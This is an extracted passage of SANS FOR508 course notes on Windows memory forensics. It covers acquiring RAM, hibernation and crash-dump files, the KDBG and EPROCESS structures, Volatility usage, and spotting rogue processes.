tools covered on this slide have all taken the steps necessary to get their drivers signed; but note that some older
tools might not operate on 64-bit systems. They also appear to be working well on Windows 11 systems.
The most important thing to know about memory acquisition is regardless of the tool you choose to dump the
memory image, any of the major memory analysis tools will be able to analyze it. Here we show several different
acquisition tools available. WinPMEM has long been one of our favorites as it supports both 32- and 64-bit
systems and includes an interesting option for "live memory analysis".[1]
So far, all the acquisition tools we have talked about require a system to be up and running. This is hardly
surprising because RAM is largely considered volatile data that disappears upon system shutdown. Although that
is indeed true, don’t overlook some of the copies of RAM that are created automatically by various operating
systems. As an example, many Windows systems—particularly laptops—maintain a hibernation capability.
When triggered, a file named "hiberfil.sys" is created when a system transitions from a sleep mode into a power
save, or hibernation mode. The "hiberfil.sys" file contains a complete copy of RAM when the power event
occurred. Copying this file from the root of the system drive can provide a ready-made memory image for
analysis, though some post-processing is required due to the file being compressed.
Kernel-mode dump files, also known as crash dump files, can also great sources for RAM analysis. Look for
“MEMORY.DMP" files in the %SystemRoot% folder (typically C:\Windows). There are multiple types of dump
files, but if a “complete memory dump” was stored, it will be obvious due to its large file size as it includes a
large portion of RAM available at the time of the crash event. Sadly, complete memory dumps are rare, but
© 2023 SANS Institute

.

11

systems can be configured to default to them upon system crashes. The registry key
SYSTEM\CurrentControlSet\Control\CrashControl\ provides information on dump file
paths, counts, and the default type of dump (CrashDumpEnabled value). Microsoft provides excellent
documentation on this topic.[2,3]
Finally, the Windows "pagefile.sys" and "swapfile.sys" files are not a complete copy of RAM, but still contain
parts of memory that were paged out to disk. The latter, "swapfile.sys“, first appeared in Windows 8 and
Server 2012 and is used to hold the working set of memory for suspended Modern applications that have been
swapped to disk.[4] The page file can be moved to different locations and volumes. With new support for
these files in tools like MemProcFS, it is a good best practice to capture them at the time of memory
collection. Information on a system’s Page File can be found in the following registry key:
SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management
Taking memory dumps from Windows server products (including VM and cloud instances) is an identical
process. However, keep in mind modern server products typically require all loaded drivers to be digitally
signed via the Windows Hardware Quality Labs (WHQL) certification process. This is a more rigorous
oversight and testing scheme than what was previously used, and it is also now being extended to some
Windows 10 and 11 versions. While this is a good thing for security and stability, it provides an obstacle for
many collection tools that have not taken the steps to submit their drivers for WHQL release. Make sure to
test your tool of choice on a similar version of Windows before using it for real cases!

.

Collecting memory dumps from virtual machines can also be accomplished with the same tools. One simple
technique would be to execute your tool of choice within the virtual machine and output the memory dump to
a mapped network share. Depending on the virtualization vendor, there may already be representations of
virtual machine memory on disk. As an example, VMware .vmem, .vmss (VMware saved state), and .vmsn
(VMware snapshot) files are used to store memory. Although these files are not raw dumps of memory, they
often can contain a full memory image and each virtual machine snapshot also typically keeps its own set of
memory files. The Volatility project has an address space that supports memory analysis for these files.[5] A
common collection technique for these files would be to suspend or snapshot the virtual machine and copy the
files from the hypervisor. If you intend to collect memory in this manner, evaluate your ability to collect and
use these files before you need them in a real incident.
[1] PMEM Memory acquisition suite: http://for508.com/erw8g
[2] Varieties of Kernel-Mode Dump Files: https://for508.com/b4d1f
[3] Overview of memory dump file options for Windows: https://for508.com/9qc3l
[4] Windows 8 / Windows Server 2012 The New Swap File: http://for508.com/mnzdt
[5] VMware Snapshot File: http://for508.com/p5ae2

12

© 2023 SANS Institute

.

Hibernation File Analysis: hiberfil.sys

• Compressed copy of RAM at the time of hibernation
• Power settings in Win10 & 11 make it more common
• Some tools can decompress to raw:
• Volatility 2 imagecopy
• hibr2bin.exe
• Arsenal Hibernation Recon

• Many tools can analyze natively:
• BulkExtractor
• Magnet AXIOM
• Volatility
• Passware
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

13

.

Windows hibernation files are created whenever a system has been placed in hibernation, or "power save"
mode. This most commonly occurs in laptop computers when the lid is closed on a running system. However,
the lines between sleep and hibernation are often blurred on modern version of Windows, so checking for the
existence of this file should be a routine check performed during any examination. The Windows hibernation
file is named "hiberfil.sys" and located in the root of the system drive (typically "C:\").
Take a step back; and think about the usefulness of a hibernation file. Even if you respond to a system that has
already been shutdown, you have a chance to still review a memory image of the system. If the system is up
and running, you now might have two different memory images to analyze: the one you acquire now, and the
one derived from the hibernation file saved days, weeks, or even months before.
Hibernation file formats utilize compression, and the format has changed between versions of Windows. A
tool is necessary to uncompress the files before they can be analyzed as a RAM dump alternative. The
Volatility memory analysis framework has long had a means to read and convert Windows hibernation files,
including a built-in address space and the imagecopy plugin present in Volatility 2. Matthew Suiche
developed a well-regarded memory analysis suite containing the hibr2bin tool to perform conversions. The
source code for the tool is available on GitHub.[1] However, both of these tools have not been updated in a
long time and hence will likely have issues with hibernation files sourced from Windows 10 and 11 systems.
Hibernation Recon from the company Arsenal Recon is perhaps the most exciting tool currently focused on
hibernation files. It can both uncompress hibernation files and extract any leftover slack space for further
analysis.[2] Arsenal Recon has demonstrated that a non-trivial amount of data can be recovered from the
leftover slack space caused by differently sized hibernation files over time. Several other forensic tools have
native hibernation file analysis capabilities. These tools will typically decompress hiberfil.sys on the fly and
perform string searching and data carving. Examples include BulkExtractor, Magnet Forensics AXIOM,
Belkasoft Evidence Center, and Passware.
Windows 8 introduced a new hibernation file format, and Windows 10 and 11 have adopted it. Research has
shown that upon a resume from hibernation in these OS versions, data is read and then subsequently zeroed
from the hibernation file as it is no longer needed.[3] This means retrieving the hibernation file on a live Win8+
system may not result in a full memory image like it did in previous versions. As a counter-point, the Arsenal
© 2023 SANS Institute

.

13

Recon team has noted that not all systems exhibit this behavior, with some of the differences apparently due to
the use of SSD or hard drives in the system.
Microsoft has also significantly updated power management and power states in the modern versions of the
operating system. While largely invisible to the end user, they can affect what artifacts are left behind when a
system is turned off. In general, Windows is leaning toward an always-on and alert model similar to mobile
devices. Power states like “Modern Standby”, “Hybrid Sleep”, and “Fast Startup” can all affect whether a
hibernation file is created.[4] Collectively, these changes should result in even more systems having hibernation
files, including systems not traditionally prone to hibernation files like desktops. The built-in Windows tool
powercfg.exe can list existing power management schemes and identify current device settings.[4]
The Volatility imagecopy plugin has long been a go-to tool for converting hibernation files, crash dump files,
and virtual machine memory images (VMware and Virtual Box) into raw memory images. This plugin exists in
Volatility version 2 and apparently will be replaced in Volatility version 3 by the layerwriter plugin
(though this capability is not in place at the time of writing). To convert a hibernation file, the imagecopy
plugin requires profile information from the subject system. This often requires trying different profiles until
you find success (or follow the best practice of documenting the build number of the system when you collect
the evidence). To run this tool, you simply specify the plugin name, the file to convert using the "-f" option,
and the output filename using "-O", and wait for completion. Example:
vol.py -f /memory/hiberfil.sys imagecopy -O hiberfil.raw --profile=Win7SP1x64

.

[1] Hibr2Bin: https://github.com/comaeio/Hibr2Bin https://for508.com/rl9vc
[2] Arsenal Recon Products: https://for508.com/38nes
[3] Modern Windows Hibernation File Analysis: http://for508.com/q9r17
[4] System Power States: http://for508.com/w-qxk

14

© 2023 SANS Institute

.

Memory Forensics in Incident Response and Threat Hunting Agenda

Why Memory Forensics?
Acquiring Memory
Introduction to Memory Analysis
Code Injection, Rootkits, and Extraction
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

15

.

This page intentionally left blank.

© 2023 SANS Institute

.

15

What Is Memory Analysis?

• Study of data captured from memory of a target system
• Ideal analysis includes physical memory data (from RAM) as
well as Page File (or Swap File) data
• Capture Raw Memory + Page File
Acquire • Hibernation File
• Establish Context
Context • Find Key Memory Offsets
• Analyze Data for Significant Elements
Analyze • Recover Evidence

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Memory forensics, also known as memory analysis, operates on data from the system’s memory, both the
RAM as well as the virtual memory storage (if available).
Memory analysis differs somewhat from traditional media forensics:

.

• The data is much more of a snapshot in time: Things might have changed dramatically from the instant
before.
• Establishing context is more complicated: We are dealing with much more information than simple files
and directories.
• The data is not in a format designed to be extracted and understood, it is in a format designed to
execute: It requires more analysis and understanding of the environment.
The memory analysis process can also be very similar to media forensics:
• Collect the data for analysis. This should be done in as forensically clean a fashion as possible. This is far
more difficult a problem for memory forensics than for media forensics, because the system must be
operating for the physical memory to be read. Unfortunately, the very act of reading the memory usually
requires execution of a program, changing the data it is collecting even as it collects it.
• Put the collected data into context. For media analysis, this means understanding the disk, the partitions,
the file system format, etc. For memory forensics, this is more complex but just as necessary. You need to
understand memory’s ever-changing architectures and how (and where) various objects are stored.
• Analyze your results to understand what the data means and identify important elements.

16

© 2023 SANS Institute

.

16

Windows Memory Analysis Process
1. Identify Context
• Find the Kernel Processor Control Region (KPCR), Kernel De bugger Data
Block (KDBG), and/or Directory Table Base (DTB)

2. Parse Memory Structures
• Executive Process (EPROCESS) blocks
• Process Environment (PEB) blocks
• DLLs loaded

• Virtual Address Descriptors (VAD) Tree
• List of memory sections belonging to the process

• Kernel modules/drivers

3. Scan for Outliers

• Unlinked processes, DLLs, sockets, and threads
• Unmapped memory pages with execute privileges
• Hook detection
• Known heuristics and signatures

4. Analysis: Search for Anomalies
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

17

We have made our best efforts to not turn this into a class on Windows Internals. Although that information is
certainly useful, it is covered in other classes (such as SANS FOR610), and there are great reference books on the
topic for those interested, including one named oddly enough, Windows Internals.[1] That being said, in order to
truly understand what is available in memory, the student needs to be familiar with some concepts.

.

First, how do our tools develop context within a memory image? How do you take a raw dump of memory and
make any sense of it? The answer exists in something called the Kernel Debugger Datablock (KDBG). The KDBG
is the key to many tools understanding a Windows memory image. It is a data structure whose pointers can be
followed to eventually find the process list for the system.[2] The KDBG can be found through two different
methods. One is to first find the Kernel Processor Control Region (KPCR), which has a pointer to the KDBG. In
some Windows versions (like XP), the KPCR is maintained at a fixed offset within memory. Thus, any tool can
point directly at that offset and follow the pointers to the rest of the objects we really care about. The fixed offset
for the KPCR changed starting with Vista, but it can still be found with a little more work. Alternatively, the
KDBG can be searched for using well-known signatures. You will notice that many memory analysis suites are
very specific about what operating systems, architectures, and even service packs that they support. This is because
unlike file systems, the memory layout is constantly changing, and it is a battle for the tool creators to stay ahead of
the curve. Finding the KPCR or KDBG takes time, so be patient while your memory analysis tool is processing!
Once the KDBG (or equivalent) is found, it leads to the EPROCESS, or executive process block list by identifying
the PsActiveProcessHead pointer. This is a list of all the currently running processes in memory. Similar to a file in
a file system, nearly everything revolves around processes in memory. Each process will have its own Process
Environment Block (PEB) that holds a host of data structures that define a process, including the full path of the
process executable, the command line that spawned the process, and a linked list of all loaded libraries (DLLs) for
the process. Each executive process block points to a Virtual Address Descriptor (VAD) tree that is responsible for
tracking every memory section (also called a memory page) assigned to that process. The VAD tree is of particular
importance to our memory analysis tools because it allows them to double check what exists in the various memory
sections for a process versus what the various lists say are present. If any discrepancies are found, that can be an
important sign that something malicious like code injection has occurred. Kernel modules are code used to extend
the functionality of the system. Device drivers are perhaps the most common of these modules, extending the
ability of the system to communicate with new hardware. Our memory analysis tools need to identify where in
© 2023 SANS Institute

.

17

Memory, these modules exist because they are frequently employed by malware to control aspects of the
running system.
Once the memory analysis tool has identified all of the component parts in memory, the next step is to start to
search for outliers. Windows memory structures are complex but surprisingly easy to circumvent. For
instance, simply unlinking a process or network socket from its corresponding list in memory will cause it to
disappear from our standard incident response tools while it is still running and available behind the scenes.
Thus, our more advanced memory analysis suites will not only rely upon the information in the various linked
lists but will instead scan memory looking for any items of a specific type. The same goes for standard kernel
activities like hooking. You can think of hooking like a detour sign; instead of going to the memory location
you were headed to, you now take a different route. Hooks are standard operating procedure within Windows,
but all of those legitimate hooks by devices or antivirus software may obscure the malicious hooks. Our
memory analysis tools will attempt to find these outliers and present them for analysis.
The final stage of memory analysis is where we fit in. Our tools present the data from the various components
discussed previously. It is up to us to review that information and look for anything suspicious or out of the
ordinary. Although the task might seem daunting, the current batch of tools does a wonderful job of facilitating
the analysis process.

.

[1] Windows Internals Book: http://for508.com/whr4l
[2] Finding Kernel Global Variables in Windows: http://for508.com/b7s4n

18

© 2023 SANS Institute

.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

19

.

Here we see a simplified representation of the various memory structures just described. Note how critical the
EPROCESS block is to understanding the makeup of memory. The KDBG structure has a pointer to the
EPROCESS block list, and each EPROCESS block has pointers to the objects which describe the code that was
loaded by the process (PEB), the objects it is using (handles), the permissions of the process (access token), the
memory sections that are owned by the process (VAD) and what threads were being used to execute code.

© 2023 SANS Institute

.

19

Introducing Volatility

• Battle-tested and
reliable
• Largest selection of
features (plugins)
• Unlikely to see
further development

Volatility 3

Volatility 2

Volatility is a framework for performing digital investigations
on Windows, Linux, and Mac memory images
• Complete re-write in
Python3
• More Efficient
• Auto-profile detection
• Core plugin parity but
lacking some features
• Misses some data

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Volatility is the best-known memory analysis tool in existence. It has been available for well over a decade and
has recently evolved dramatically. The power of Volatility lies in it being an open-source memory analysis
framework, allowing and encouraging development from multiple entities. It has greatly facilitated memory
analysis research in the forensics community and benefited from crowd-sourced plugin development. While you
initially might find it a little challenging to get used to, Volatility unlocks powerful memory analysis
capabilities. Original contributors to Volatility include Mike Auty, Andrew Case, Michael Cohen, Brendan
Dolan-Gavitt, Jamie Levy, Michael Ligh, Aaron Walters, and many others.
While Volatility version 2 (Volatility 2) is still viable for many use cases, Volatility version 3 (Volatility 3) is a
complete re-write resulting in significant upgrades. Volatility 3 has been under construction since 2012 and was
originally called the “Technology Preview”, the same project fork from which the now discontinued Rekall
memory forensics framework was born. Volatility 3 is written in Python3 and prioritized performance
(important for the large memory images) and scalability (features like auto-profile detection allow analysis of
multiple memory samples at once). Other upgrades include better support for WoW64 analysis (a vast amount
of malware is still 32-bit) and code emulation to provide more information to analysts looking at advanced
injection and rootkit attacks. Perhaps the most exciting part of this re-write is a new API and better developer
tools which should significantly reduce the hurdles for plugin development and result in more features
contributed in the future. You will see both versions of Volatility in use during the course. While Volatility 3 has
achieved core capability parity with the previous version, it is still missing some of the beloved “special” plugins
that can extract extremely useful data from memory images in Volatility 2. Due to the community nature of the
tool, it is likely that many of these “special” plugins will never be ported to Volatility 3. We have also witnessed
situations where Volatility 3 plugins are not as capable as their predecessors, resulting in missing data, or failing
completely on certain memory images. For this reason, we often double-check our results with the older version.
We believe that providing examples and references for both versions of the tools will ensure you are ready for
real-world memory forensics both now and in the future. With a little practice, you will find the workflow and
associated output are extremely similar between the two versions.
By accessing the Volatility software provided in this course, you agree to the following terms:
https://www.volatilityfoundation.org/license/vsl-v1.0
© 2023 SANS Institute

20

.

20

Volatility Usage

Volatility 2
vol2.py –f [image] –-profile=[profile] [plugin]

Volatility 3
vol.py –f [ image] [plugin]

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

21

.

Volatility is written completely in Python, hence the ".py" extension. It is command line based and has already
been placed in the user path in your class virtual machine, so you can simply use the vol2.py (version 2) or
vol.py (version 3) command to invoke it.[1] There are a few options you will use with almost every plugin. First,
the "­f" option is required and should be followed with the name and path of the memory image you want to
analyze. The [plugin] option tells Volatility what plugin to run and hence what you want it to do. The examples
on this slide show the pslist plugin being invoked and used to output a list of processes found within the memory
image. Finally, when using Volatility 2, you must explicitly specify the operating system version using the “-profile=" parameter. We will talk about how to determine this information from an unknown memory image
shortly.
We will be adding additional command line parameters as new capabilities are introduced. As an example, the
--pid argument can narrow output to a specific process identifier. Note that Volatility 3 is much less tolerant
of argument order than the previous version. If you ever need to troubleshoot a command in Volatility 3,
reference the usage (-h) information to make sure arguments are in the expected order.
If you have previous experience using Volatility, you will notice Volatility 3 has a very different plugin naming
scheme. While seemingly repetitive, it allows plugins to be divided by operating system type as well as
allowing the potential for different capabilities to be included within the same plugin. While there are no
current examples of this flexibility being used, you could see plugins windows.pslist.Pslist_ver1 and
windows.pslist.Pslist_ver2 in the future. To reduce the typing required, Volatility 3 will perform
substring matching and if it finds a unique hit, use that hit as the desired plugin. Thus, a shortened version like
windows.pslist will currently work identically to the more explicit windows.pslist.PsList (though
a handful of plugins do require the full three-part name). There are multiple online resources for Volatility
plugin information. Ashley Pearson maintains a particularly good reference for both versions 2 and 3.[2]
[1] Volatility Foundation on GitHub: https://for508.com/prtv6
[2] Volatility CheatSheet: https://for508.com/lz8pi
** Volatility is a trademark of the Volatility Foundation. The SANS Institute is not sponsored, approved by, or
affiliated with the Volatility Foundation. **
© 2023 SANS Institute

.

21

Profile Identification and Build Numbers

• Memory structures can differ across OS builds
• Volatility 2 requires profiles: Win10x64_16299
• Volatility 3 performs online symbol table lookups

• Document the version and build during collection
• In Vol2, kdbgscan can identify the build string
• You can also make a best guess. Change profiles i f:
• pslist shows garbage process names
• psscan finds no processes
• filescan finds no files
• hivelist finds no registry hives
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

With the arrival of Windows 10, Microsoft began releasing major operating system updates at a much faster rate
(typically twice per year). This has put significant pressure on memory forensic tools as new operating system
versions nearly always include at least some changes to in-memory data structures. The best way to track these
new versions (and the changes they make in memory structures) is via the Microsoft build number. You can
find this on a live system, via “About Your PC” (the image on this slide shows example output from this dialog).
This would be an excellent item to document when you acquire a memory image.
This is largely not an issue in Volatility 3 as it includes the ability to perform symbol table lookups. A symbol
table is a data structure, often found in debugging information, providing a template for how objects are defined
and where important information resides to better understand the source code. Symbol tables imported by
Volatility provide the means to find and parse critical data structures present in memory (like process objects).
The explicit profiles provided in Volatility 2 define the symbol table to be used, but these are much less flexible
than the more dynamic lookups available in Volatility 3. This does come with a cost: Volatility 3 typically
requires Internet access to perform symbol table lookups from the Microsoft website. However, symbol tables
can be downloaded and stored locally if your use case requires offline access.[1] The Volatility project provides
some rather large symbol table packs of profiles available for download to get you started.[3]
When using Volatility 2, kdbgscan is often the first plugin used during examination of a new memory image
because it helps identify what Volatility profile must be used for further analysis. The profile is the value that
must be explicitly provided via the “--profile=" option to each subsequent plugin in Volatility 2. Kdbgscan
searches the memory image for matches of known KDBGHeader signatures for a variety of different OS
profiles. Once a potential structure is found, it subjects the data to a series of sanity checks to help eliminate
false positives (signature detection for the KDBG is particularly prone to false positives and invalid structures).
Starting in Windows 8 x64, the KDBG structure is encrypted (an effort to frustrate some exploits). Thus, for
more modern versions of Windows, this plugin also needs to search for a function named KdCopyDataBlock to
derive the decryption key. As you might imagine, all of this takes time, making kdbgscan one of the slowest
Volatility plugins to complete. Since running this plugin can take a long time, you can also just try multiple
profiles until you find one providing valid plugin data (you may be able to make an educated guess based on
when the image was created or pull the information from the Windows registry if that is available). The
Volatility project provides some guidance on how to verify a correct profile.[3] Very simply, if you see a good
22

© 2023 SANS Institute

.

22

process list when using the pslist and psscan plugins and good output from filescan and hivelist, it’s a good
indication the profile you are using is parsing major memory structures correctly. If you see no data, or garbage
output from any plugins, it could be an indication you do not have a good profile match. This technique is most
useful when “guessing” a profile while using Volatility 2 but can also be a good test of the symbol table in use
by Volatility 3 (the plugins above would need to be converted to their Volatility 3 equivalents when testing that
version, such as windows.pslist.PsList). The Volatility 3 plugin windows.info.Info also shows similar
information to kdbgscan.
The output from kdbgscan can be overwhelming at first glance. You will see a long list of output showing
KDBGHeader structures found and then subjecting them to sanity checks to help the analyst find the correct
match. Things to look for when evaluating the output:
•
•
•
•
•
•

Are any processes identified in the PsActiveProcessHead?
Are any modules identified in the PsLoadedModuleList?
Does the KernelBase include a note stating “Matches MZ: True”?
Is a Build string provided?
Does the Profile suggestion match the Build string?
Are KPCR addresses provided?

.

There can be multiple legitimate KDBG structures found in a memory image, and a KDBG structure may
successfully map to multiple different Volatility profiles. By outputting all the results, kdbgscan allows you to
be more comprehensive in your search for the best profile to use with Volatility 2. You will often need to pick
the best choice among those provided (and try the others if your first choice is problematic). Example output
follows.

[1] How to Use Volatility 3 Offline – JPCERT: https://for508.com/32dl9
[2] Volatility 3 Symbol Table Packs: https://for508.com/f6pzw
[3] Volatility 2 Profiles and Troubleshooting: http://for508.com/iq428

© 2023 SANS Institute

.

23

Help!
• The -h flag gives configuration information in Volatility
• Used alone it identifies the version, currently loaded plugins, and
common parameters
• Use -h with a plugin to get details and plugin-specific usage

• To see profiles and registered objects in Volatility 2, use --info

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

It is easy to get lost when you are first using Volatility, but luckily there is a lot of good documentation available. If
you are ever stuck, try the "-h" option. When used alone, this option will provide a list of available plugins,
parameters common to all plugins, and usage information. When the "-h" option is used in conjunction with a
specified plugin, it provides a brief description of the plugin and any plugin-specific options (as seen on the slide).
Keep in mind the options are sometimes misleading. Volatility is an open framework and some of the available
plugins inherit options that are not specific to that plugin. You may need to conduct further research or testing to see
if an option is valid. In Volatility 2, another helpful option is “--info”, which also displays available profiles and
address spaces available for your installation of Volatility.
Throughout this training, we have done our best to provide the most up-to-date list of useful options for each tool
presented. A good next step when learning Volatility is to read the project documentation.[1,2] Current documentation
includes a command reference (Volatility 2 only for now), documentation links, sample images to work with, and
project information like bugs and issues being tracked.
[1] Volatility 2 Command Reference: http://for508.com/eqgx3
[2] Volatility 3 Documentation: https://for508.com/f65q7

24

© 2023 SANS Institute

.

24

Performing Memory Analysis

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

25

.

This page intentionally left blank.

© 2023 SANS Institute

.

25

Finding the First "Hit"

1

• Identify rogue processes

2

• Analyze process objects

3

• Review network artifacts

4

• Look for evidence of code injection

5

• Audit drivers and rootkit detection

6

• Dump suspicious processes and
drivers
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Memory analysis takes practice, but it really is no longer a "dark art". Current tools make memory analysis
much more feasible and less time-consuming. However, more important than having tools is following the right
process. Many parts of memory forensics lend themselves to identifying malware using the three traditional
malware detection methods: signature, contradiction, and heuristic/behavioral. Detection by contradiction is
especially fruitful given the variety of analysis methods memory forensics provides to the examiner.
Imagine you are handed a memory image and asked to review it for signs of an intrusion or malware. Where do
you start? Your goal should be to find that first "hit"—something suspicious that can be analyzed further and
used to help find other suspicious occurrences. Start with a review of processes because they are the most
important objects in memory. Continue your analysis by scrutinizing all of the various helper objects assigned to
each process. In this second and third phase, you will review items like loaded libraries (DLLs), files handled,
registry keys, mutants, and network sockets. If you do not yet find anything out of the ordinary, consider
searching for signs of code injection, looking to see whether malware might have taken over a legitimate
process. Also, pay attention for signs of rootkit techniques. Rootkits might be difficult to spot on a running
system but are often glaringly obvious when looked at through the lens of memory. Finally, extract any
suspicious processes, drivers, and memory pages and continue your analysis outside of the memory image via
malware reverse engineering techniques or simple antivirus scans.
This process takes a layered approach. It is conceivable that you might miss a suspicious process or DLL among
the hundreds present in the memory image. But by rigorously working down your checklist, you might find a
different clue like an injected memory page or loaded driver leading back to that evil process.

48

© 2023 SANS Institute

.

26

Step 1:
Identify Rogue Processes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

27

.

This page intentionally left blank.

© 2023 SANS Institute

.

27

EPROCESS Blocks in Memory

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Processes are a logical place to start because they are one of the most important building blocks within memory.
Processes tell us what was running on the acquired system. Some of the most critical information we can get in
malware investigations is going to be via process blocks. For those familiar with traditional disk-based forensics,
think of processes like files in a file system. Some are allocated (currently in use), and some are unallocated and
waiting to be overwritten. Process information is tracked by the operating system using an Executive Process
Block, or EPROCESS for short. The EPROCESS block holds a majority of the metadata for a process. It gives us:
•
•
•
•
•
•
•
•
•
•

Name of process executable (image file name)
Process Identifier (PID)
Parent Process Identifier (PPID)
Location in memory (Offset)
Creation time
Termination (exit) time
Threads assigned to the process
Handles to other operating system artifacts
Link to the Virtual Address Descriptor tree
Link to the Process Environment Block

With multiple processes running simultaneously, the kernel uses a doubly linked list, like the one seen in the slide,
to track processes. Notice the flink (forward link) and blink (back link) fields in each EPROCESS block. This
doubly linked list is very important to understanding processes. Typically, only "allocated", or currently running
processes, will be found in the list; when a process exits, the block will eventually be unlinked and discarded.
Similarly, malware with access to the Windows kernel can also unlink itself using rootkit techniques like Direct
Kernel Object Manipulation. The takeaway is that our memory analysis tools can’t just read this doubly linked
EPROCESS list from the kernel and be done. To do a thorough job of identifying every process, tools must also
scan the entire memory image for recoverable process blocks.

28

© 2023 SANS Institute

.

28

.
© 2023 SANS Institute

.

29

Rogue Process Identification
Image Name
• Legitimate
process?
•
Spelled correctly?
•
Matches system
context?

Command Line
• Executable matches
image name?
• Do arguments make
sense?

Full Path
• Appropriate path for
system executable?
• Running from a user
or temp directory?

Start Time
• Was the process started at
boot (with other system
processes)?
• Processes started near time
of known attack.

Parent Process

• Is the parent process
expected?
• Orphan processes

Security IDs
• Do the security identifiers
make sense?
• Why would a system
process use a user account
SID?

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Memory analysis tools will easily get us a list of all processes and their associated metadata. The harder part is
knowing how to analyze the information and identify anomalies. When reviewing processes in a memory image,
concentrate on these six items:
Image name: The name of the process executable itself might give us useful information. Seasoned incident
responders can often spot process names that don’t belong on a standard Windows system. Attackers can
name their processes to blend in or hide in plain sight. This can be a successful technique owing to how
complicated Windows systems are and how many processes might be running. Look for subtle misspellings
or legitimate process names that shouldn’t necessarily be running on the system you are analyzing. For
instance, the Firefox browser executable is named “firefox.exe". Seeing that process on a workstation might
not cause much interest, but on a server, it should be much rarer.
Full path: Malware will sometimes camouflage itself with legitimate image names run from abnormal
locations. Explorer.exe should always run from the Windows directory and chrome.exe from the Program
Files directory. If you see a process with these names running from the \Windows\System32 directory, you
should take notice. Malware will sometimes be spawned from a Temp directory or even an unusual directory
like the Recycle Bin. Because very few legitimate processes run from these locations, this should be an
obvious clue to look further into that process.
Parent process: Knowing what process spawned another can help us in our search. Many user applications
have a parent process of Explorer.exe, which is the user shell. If you see a process named like a system
process, say "svchost.exe", running with Explorer.exe as its parent, that is suspicious. Similarly, knowing the
parent process tells you where in the system boot hierarchy something was loaded. A process parented by
Explorer.exe was likely spawned after logon, whereas one parented by Services.exe could have been
spawned at boot and hence have a persistence mechanism. Processes with no parents can also be interesting.
While some system processes like smss.exe are commonly orphaned, the absence of a parent process can be
an indication of advanced attacks like code injection.

.

•

•

•

Command line: The Process Environment Block records the full command line used to start a process. This
allows us to check that the actual executable matches its image name and identify any strange arguments that
might have been used.

30

© 2023 SANS Institute

.

30

•

Start time: The start time is underutilized but can be a great source of information. If you have evidence
of an attack occurring near a certain time, look for processes started after that time. Do you see six
svchost.exe processes and all but one started within seconds of one another? It might be worth looking at
the outlier. Once you identify a suspicious process, you can look more closely at other processes started
around that time. Finally, you can usually determine whether a process was started at boot time or later by
comparing the timestamp with the timestamps of known system processes like smss.exe or winlogon.exe.
Security identifiers: The security identifier can tell us what level of account (privileges) spawned a
process. Seeing user SIDs are most obvious (they are much longer than standard system account SIDs), but
you can also use SIDs to determine exactly what account was used to start a process. Was the process
started by System when it should have been started by LocalService?

.

•

© 2023 SANS Institute

.

31

.
32

© 2023 SANS Institute

.

Identify Rogue Processes with Volatility
windows.pslist

Print all running processes within the EPROCESS doubly linked list

windows.psscan

Scan physical memory for EPROCESS pool allocations

windows.pstree

Print process list as a tree showing parent relationships (using
EPROCESS doubly linked list)

Memory
Baseliner

Compare processes and loaded DLLs with a baseline image

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

33

.

Processes make up the major building blocks of a memory image and are a logical place to start our memory
analysis. Volatility takes a modular approach, with a specialized plugin for each item or action we want to
examine and test. The plugins listed here can help us analyze information in the first step of our analysis
checklist: Identify Rogue Processes. Each one provides slightly different information.

© 2023 SANS Institute

.

33

Identify Rogue Processes: windows.pslist.PsList

Purpose
• Identify processes by following the EPROCESS linke d list

Important Parameters
• Show information for specific process IDs (--pid)
• Render output in sized columns (-r pretty)

Investigative Notes
• Provides the binary name (ImageFileName), parent process
(PPID), and time started (CreateTime)
• Volatility 3 includes a Wow64 column to ID 32-bit code
• Rootkits can unlink malicious processes from the linked list,
rendering them invisible to this tool
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Identifying the running processes is one of the first steps you will regularly perform when examining memory.
The windows.pslist.PsList plugin is a fast and easy means to get this information. The plugin works
by finding the EPROCESS list in the kernel, following the doubly linked list, and parsing information about
each process. For each identified process, the plugin provides:
Process Identifier (PID)
Parent Process Identifier (PPID)
Process name (Image File Name)
Virtual offset of EPROCESS block (Offset(V))
Number of threads (Threads)
Number of handles (Handles)
Session identifier (SessionID)
64 or 32 bit code (Wow64)
Process start time (CreateTime)
Process stop time (ExitTime)

.

•
•
•
•
•
•
•
•
•
•

Each of these process attributes can be reviewed for anomalies. A hallmark of Volatility is it will attempt to
provide as much information as it can extract from the data structures. Some of this information is probably
overkill for most of our memory analysis purposes, such as the session identifier and handle count, but there
might be times where comparisons with like processes lead you to believe one is anomalous.
The rendering, or “-r”, option can be used with many Volatility 3 plugins to change the output format. The “-r
pretty” option works well for console output, while the “-r csv” and “-r json” options can be useful when
exporting data for use in a spreadsheet, database, or other review tool.
Equivalent plugin in Volatility 2: pslist

34

© 2023 SANS Institute

.

34

Identify Rogue Processes: Hiding in Plain Sight

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

35

In this example, we have malware hiding in plain sight. This memory sample stumped us at first. We completely
missed the misspelling and believed it to be just another svchost.exe process. But what caused us to look deeper
in the process details? Is there anything out of the ordinary in the process list?

.

• The parent of the process is Explorer.exe, not Services.exe as we would expect for a svchost.exe process.
• This process was not started at the same time as the other svchost.exe processes
Of course, it turned out that all of the previous information was true because this process is NOT a svchost.exe
process. It just happens to have a VERY similar name. The good news is that once you find a malicious process
like this, that misspelled name can be a very useful indicator to search for on the current system as well as other
systems in your enterprise.
Keep in mind that the windows.pslist.PsList plugin is the most basic of all of the process plugins. It
might not find processes hidden by rootkits or other means.

© 2023 SANS Institute

.

35

.
36

© 2023 SANS Institute

.

Know Normal to Find Evil

